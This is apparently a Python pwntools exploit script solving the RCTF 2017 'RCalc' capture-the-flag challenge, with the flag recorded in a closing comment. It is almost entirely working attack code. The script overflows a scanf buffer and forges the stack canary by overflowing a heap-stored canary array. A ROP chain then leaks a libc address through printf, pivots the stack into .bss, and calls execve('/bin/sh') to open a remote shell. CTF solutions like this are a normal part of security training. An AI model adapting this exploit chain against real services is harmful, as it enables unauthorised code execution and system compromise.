#!/usr/bin/env python2

from pwn import *

###

if len(sys.argv) > 1:
    DEBUG = False
    libc = ELF('libc.so.6')
else:
    DEBUG = True
    libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')

b = ELF('RCalc')
context.log_level = 'info'
context.arch = 'amd64'
RDI = 0x0000000000401123 #: pop rdi ; ret
RSI = 0x0000000000401121 #: pop rsi ; pop r15 ; ret

###

if DEBUG:
    r = process('./RCalc', aslr=False)
else:
    r = remote('rcalc.2017.teamrois.cn', 2333)

def menu():
    global r
    r.recvuntil('choice:')

def add(a, b, save=True):
    global r
    r.sendline('1')
    r.recvuntil('integer: ')
    r.sendline(str(a))
    r.sendline(str(b))
    r.recvuntil('result? ')
    if save:
        r.sendline('yes')
    else:
        r.sendline('no') # can be whatever else
    return menu()

GDB = False
if DEBUG and GDB:
    gdb.attach(r, '''b *0x0000000000401035''')
r.recvuntil('pls: ')
# we overflow using scanf, we have forbidden char like space, \n, 0x0b, 0x0c
ROP  = 'A' * 0x108
ROP += p64(0xffffffffffffffff) # SSP
ROP += p64(b.bss(0x50)) # rbp, needed cause we are stack pivoting later on
# first we leak libc using printf
ROP += p64(RDI)
ROP += p64(0x0000000000401203) # string: %s
ROP += p64(RSI)
ROP += p64(0x0000000000601FF0) # got.__libc_start_main
ROP += p64(0xdeadbeef) # bogus
ROP += p64(b.plt['printf']) # leaking part
# setting rdx for read
ROP += p64(0x000000000040111A) # pop rbx ; pop rbp ; pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret
ROP += p64(0) # rbx
ROP += p64(1) # rbp
ROP += p64(0x0000000000601E10) # ptr to _fini
ROP += p64(0x100) # value for rdx
ROP += p64(0xdeadbeef) * 2 # r14 and r15
ROP += p64(0x0000000000401100) # gadget to set rdx
ROP += p64(0) * 7 # padding
ROP += p64(RDI) # stdin for read
ROP += p64(0)
ROP += p64(RSI)
ROP += p64(b.bss(0x50) + 0x8)
ROP += p64(0xdeadbeef) # bogus
ROP += p64(b.plt['read'])
ROP += p64(0x00000000004010b2) # mov eax, 0 ; pop rbp ; ret
ROP += p64(b.bss(0x50)) # restoring rbp before stackpivoting
ROP += p64(0x0000000000400E37) # leave ; ret
r.sendline(ROP)
menu()
# overflow the heap into the ssp_arr to make the ssp we overwrote the same
for x in xrange(35):
    add(-1, 0)
r.sendline('5') # exit, triggering our rop

d = r.recv(6)
d = u64(d.ljust(8, '\x00'))
libcbase = d - libc.symbols['__libc_start_main']
execve = libcbase + libc.symbols['execve']
binsh = libcbase + libc.search('/bin/sh').next()
log.info('leak: %#x' % d)
log.info('libcbase: %#x' % libcbase)
log.info('execve: %#x' % execve)
log.info('binsh: %#x' % binsh)

# second part ROP just ret2libc
ROP  = p64(RDI)
ROP += p64(0)
ROP += p64(b.plt['alarm']) # canceling alarm
ROP += p64(RSI)
ROP += p64(0) * 2
ROP += p64(libc.search(asm('pop rdx\nret')).next() + libcbase) # pop RDX
ROP += p64(0)
ROP += p64(RDI)
ROP += p64(binsh)
ROP += p64(execve)
ROP += p64(RDI)
ROP += p64(0) # exit code
ROP += p64(libcbase + libc.symbols['exit'])
r.sendline(ROP)

r.interactive()
r.close()

# RCTF{Y0u_kn0w_th3_m4th_9e78cc}
